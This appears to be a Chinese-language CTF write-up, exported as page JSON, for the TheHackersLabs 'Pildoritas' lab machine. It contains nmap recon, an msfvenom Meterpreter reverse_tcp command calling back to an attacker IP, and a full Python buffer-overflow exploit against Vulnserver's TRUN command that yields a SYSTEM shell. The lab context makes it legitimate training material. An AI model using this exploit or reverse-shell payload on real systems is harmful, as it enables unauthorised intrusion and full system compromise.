{"pageProps":{"postData":{"id":"TheHackersLabsPildoritas","contentHtml":"<h1>Pildoritas</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/67\">https://labs.thehackerslabs.com/machine/67</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsPildoritas/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Pildoritas nmap -sn 192.168.56.0/24               \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00052s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00037s latency).\nMAC Address: 08:00:27:31:BB:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.93\nHost is up (0.00069s latency).\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.5\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 6.09 seconds\n</code></pre>\n<p>这次不打 <code>AD</code> 域</p>\n<pre><code class=\"hljs language-bash\">➜  Pildoritas nmap -sT -min-rate 10000 -p- 192.168.56.93    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST\nWarning: 192.168.56.93 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.93\nHost is up (0.00029s latency).\nNot shown: 65267 closed tcp ports (conn-refused), 257 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n9999/tcp  open  abyss\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 19.78 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Pildoritas nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 192.168.56.93\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:11 CST                                                                                                                                 \nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.93                                                              \nHost is up (0.00035s latency).\n\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 7.0\n|_http-title: 404: archivo o directorio no encontrado.\n|_http-server-header: Microsoft-IIS/7.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n9999/tcp open  vulnserver    Vulnserver\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Microsoft Windows 2008|7|Vista|8.1\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1\nOS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2:0:2: \n|_    Message signing enabled but not required\n|_clock-skew: 6h59m57s\n| smb2-time: \n|   <span class=\"hljs-built_in\">date</span>: 2025-07-24T21:12:18\n|_  start_date: 2025-07-24T20:57:33\n|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: &#x3C;unknown>, NetBIOS MAC: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.35 ms 192.168.56.93\n</code></pre>\n<h3>枚举测试</h3>\n<p><code>SMB</code> 匿名枚举</p>\n<pre><code class=\"hljs language-bash\">➜  Pildoritas smbclient -L 192.168.56.93 -U anonymous\nPassword <span class=\"hljs-keyword\">for</span> [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILUR\n</code></pre>\n<h2>Vulnserver</h2>\n<p>从<code>nmap</code> 中的扫描结果能知道搭建着 <code>Vulnserver</code></p>\n<p>项目链接：<a href=\"https://github.com/stephenbradshaw/vulnserver\">https://github.com/stephenbradshaw/vulnserver</a></p>\n<pre><code class=\"hljs language-bash\">➜  Pildoritas nc 192.168.56.93 9999 \nWelcome to Vulnerable Server! Enter HELP <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span>.\n</code></pre>\n<p>直接从网上找 <code>POC</code> ：<a href=\"https://forum.butian.net/share/4013\">https://forum.butian.net/share/4013</a></p>\n<p>将里面的<code>payload</code> 换成自己的就行</p>\n<pre><code class=\"hljs language-bash\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=1234 -f c -e x86/shikata\\_ga\\_nai -b <span class=\"hljs-string\">\"\\\\x00\"</span> -f python -v shellcode\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/usr/bin/python</span>\n\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n    server = sys.argv[1]\n    port = 9999\n    size = 2006\n\n    shellcode = b<span class=\"hljs-string\">\"\\x90\"</span> * 20\n    \n    // 替换\n    shellcode += b<span class=\"hljs-string\">\"\\xd9\\xc0\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xbb\\x6b\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xc5\\x71\\xf0\\xb1\\x59\\x31\\x58\\x19\\x83\\xe8\\xfc\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x03\\x58\\x15\\x89\\x30\\x8d\\x18\\xc2\\xbb\\x6e\\xd9\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xbc\\x32\\x8b\\xe8\\xee\\x21\\xdf\\x59\\x3e\\x21\\x8d\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x51\\xb5\\x67\\x26\\x5b\\x36\\x0c\\x34\\xb3\\xc7\\xa4\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xf3\\xe5\\xe6\\x0a\\xaf\\xd6\\x69\\xf7\\xb2\\x0a\\x49\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xc6\\x7c\\x5f\\x88\\x0f\\xcb\\x15\\x65\\xdd\\x9b\\x5e\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x2b\\xf2\\xa8\\x23\\xf7\\xf3\\x7e\\x28\\x47\\x8c\\xfb\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xef\\x33\\x20\\x05\\x20\\x30\\xf0\\x1d\\x4b\\x1e\\x21\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x1f\\x98\\xce\\xa4\\xd6\\x6a\\xd2\\x97\\x17\\xdb\\xa1\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xec\\x6c\\xdd\\x63\\x3d\\xb3\\x1f\\x44\\x33\\x9f\\xa1\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x9d\\x74\\x3f\\xd4\\xd5\\x86\\xc2\\xef\\x2e\\xf4\\x18\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x65\\xb0\\x5e\\xea\\xdd\\x14\\x5e\\x3f\\xbb\\xdf\\x6c\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xf4\\xcf\\x87\\x70\\x0b\\x03\\xbc\\x8d\\x80\\xa2\\x12\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x04\\xd2\\x80\\xb6\\x4c\\x80\\xa9\\xef\\x28\\x67\\xd5\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xef\\x95\\xd8\\x73\\x64\\x37\\x0e\\x03\\x85\\xc7\\x2f\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x59\\x11\\x0b\\xe2\\x62\\xe1\\x03\\x75\\x10\\xd3\\x8c\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x2d\\xbe\\x5f\\x44\\xe8\\x39\\xd6\\x42\\x0b\\x95\\x50\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x02\\xf5\\x16\\xa0\\x0a\\x32\\x42\\xf0\\x24\\x93\\xeb\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x9b\\xb4\\x1c\\x3e\\x31\\xbf\\x8a\\x01\\x6d\\x87\\x4f\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xea\\x6f\\xf8\\x4b\\x38\\xe6\\x1e\\x03\\xec\\xa8\\x8e\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xe4\\x5c\\x08\\x7f\\x8d\\xb6\\x87\\xa0\\xad\\xb8\\x42\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xc9\\x44\\x57\\x3a\\xa1\\xf0\\xce\\x67\\x39\\x60\\x0e\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xb2\\x47\\xa2\\x84\\x36\\xb7\\x6d\\x6d\\x33\\xab\\x9a\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x0a\\xbb\\x33\\x5b\\xbf\\xbb\\x59\\x5f\\x69\\xec\\xf5\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x5d\\x4c\\xda\\x59\\x9d\\xbb\\x59\\x9d\\x61\\x3a\\x6b\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xd5\\x54\\xa8\\xd3\\x81\\x98\\x3c\\xd3\\x51\\xcf\\x56\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xd3\\x39\\xb7\\x02\\x80\\x5c\\xb8\\x9e\\xb5\\xcc\\x2d\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x21\\xef\\xa1\\xe6\\x49\\x0d\\x9f\\xc1\\xd5\\xee\\xca\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x51\\x11\\x10\\x88\\x7d\\xba\\x78\\x72\\x3e\\x3a\\x78\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x18\\xbe\\x6a\\x10\\xd7\\x91\\x85\\xd0\\x18\\x38\\xce\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x78\\x92\\xad\\xbc\\x19\\xa3\\xe7\\x61\\x87\\xa4\\x04\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\xba\\x38\\xde\\x65\\x3d\\xb9\\x1f\\x6c\\x5a\\xba\\x1f\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x90\\x5c\\x87\\xc9\\xa9\\x2a\\xc6\\xc9\\x8d\\x25\\x7d\"</span>\n    shellcode += b<span class=\"hljs-string\">\"\\x6f\\xa7\\xaf\\x7d\\x23\\xb7\\xe5\"</span>\n\n    inputBuffer = b<span class=\"hljs-string\">\"TRUN .\"</span> + b<span class=\"hljs-string\">\"\\x41\"</span> * size + b<span class=\"hljs-string\">\"\\xaf\\x11\\x50\\x62\"</span> + shellcode\n\n    buf = inputBuffer\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Sending evil buffer...\"</span>)\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((server, port))\n    s.send(buf)\n    s.close()\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Done!\"</span>)\n\nexcept socket.error:\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Could not connect!\"</span>)\n</code></pre>\n<p>运行后成功拿到 <code>Shell</code></p>\n<p><img src=\"/post-images/TheHackersLabsPildoritas/image1.png\" alt=\"image.png\"></p>\n<p>直接就是<code>SYSTEM</code> 权限</p>\n<pre><code class=\"hljs language-bash\">meterpreter > <span class=\"hljs-built_in\">ls</span>\nListing: C:\\Users\\Administrador\\Desktop\n=======================================\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100666/rw-rw-rw-  282    fil   2024-07-22 00:38:48 +0800  desktop.ini\n100666/rw-rw-rw-  1646   fil   2024-07-22 01:00:39 +0800  essfunc.c\n100666/rw-rw-rw-  16601  fil   2024-07-22 01:00:11 +0800  essfunc.dll\n100666/rw-rw-rw-  36     fil   2024-07-22 01:46:33 +0800  root.txt\n100666/rw-rw-rw-  9033   fil   2024-07-22 01:00:31 +0800  vulnserver.c\n100777/rwxrwxrwx  29624  fil   2024-07-22 00:59:45 +0800  vulnserver.exe\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n\nmeterpreter > <span class=\"hljs-built_in\">cat</span> root.txt\nbe3751d9c6dxxxxxxxxxxxxxxxxxxxxxxx  -\n\nmeterpreter > <span class=\"hljs-built_in\">cat</span> user.txt\n3163xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  -\n</code></pre>\n<h2>总结</h2>\n<p>不清楚是否是让直接梭哈</p>\n<p>还是有预期做法</p>\n<p>感觉怪怪的</p>","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","updated":"2025-07-24","tags":["TheHackersLabs","Vulnserver"],"categories":"靶机","comments":true,"description":"Pildoritas\n\n https://labs.thehackerslabs.com/machine/67\n \n\n\n\nRecon\n\nPortScan\n\n\n\n这次不打 `AD` 域\n\n\n\n\n\n枚举测试\n\n`SMB` 匿名枚举\n\n\n\nVulnserver\n\n从`nmap` 中的扫描结果能知道搭建着 `Vulnserver`\n\n项目链接：https://github.com/stephenbrads..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}